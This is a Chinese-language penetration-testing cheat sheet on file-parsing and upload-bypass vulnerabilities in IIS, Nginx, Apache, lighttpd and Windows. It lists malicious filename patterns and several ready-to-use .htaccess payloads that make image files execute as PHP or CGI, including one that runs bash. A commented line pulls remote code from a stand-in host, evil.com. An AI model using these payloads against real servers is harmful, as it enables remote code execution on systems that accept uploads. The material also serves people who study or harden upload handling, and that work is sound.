中间件
========================================

IIS
----------------------------------------

IIS 6.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 后缀解析 ``/xx.asp;.jpg``
- 目录解析 ``/xx.asp/xx.jpg`` (xx.asp目录下任意解析)
- 默认解析 ``xx.asa`` ``xx.cer`` ``xx.cdx``
- PROPFIND 栈溢出漏洞
- PUT漏洞 WebDAV任意文件上传

IIS 7.0-7.5 / Nginx <= 0.8.37
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在Fast-CGI开启状态下，在文件路径后加上 ``/xx.php`` ，则 ``xx.jpg/xx.php`` 会被解析为php文件

其他
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件

Nginx
----------------------------------------

Fast-CGI关闭
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞：
在文件路径(xx.jpg)后面加上 ``%00.php`` ， 即 ``xx.jpg%00.php`` 会被当做 php 文件来解析

Fast-CGI开启
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在Fast-CGI开启状态下，在文件路径后加上 ``/xx.php`` ，则 ``xx.jpg/xx.php`` 会被解析为php文件

CVE-2013-4547
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``"a.jpg\x20\x00.php"``

Apache
----------------------------------------

后缀解析
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``test.php.x1.x2.x3`` （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析

.htaccess
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
当AllowOverride被启用时，上传启用解析规则的.htaccess

::

    AddType application/x-httpd-php .jpg

::

    php_value auto_append_file .htaccess
    #<?php phpinfo();

::

    Options ExecCGI
    AddHandler cgi-script .jpg

::

    Options +ExecCGI
    AddHandler fcgid-script .gif
    FcgidWrapper "/bin/bash" .gif

::

    php_flag allow_url_include 1
    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
    #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
    #php_value auto_append_file https://evil.com/evil-code.txt

CVE-2017-15715
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
%0A绕过上传黑名单

lighttpd
----------------------------------------
``xx.jpg/xx.php``

Windows
----------------------------------------
Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动取出，所以可以使用 ``xx.php[空格]`` ， ``xx.php.``， ``xx.php/``， ``xx.php::$DATA`` 可以上传脚本文件

参考链接
----------------------------------------
- `CVE-2013-4547 Nginx解析漏洞深入利用及分析 <http://www.91ri.org/9064.html>`_
- `Apache 上传绕过 <https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html>`_
- `利用Windows特性高效猜测目录 <https://xz.aliyun.com/t/2318>`_
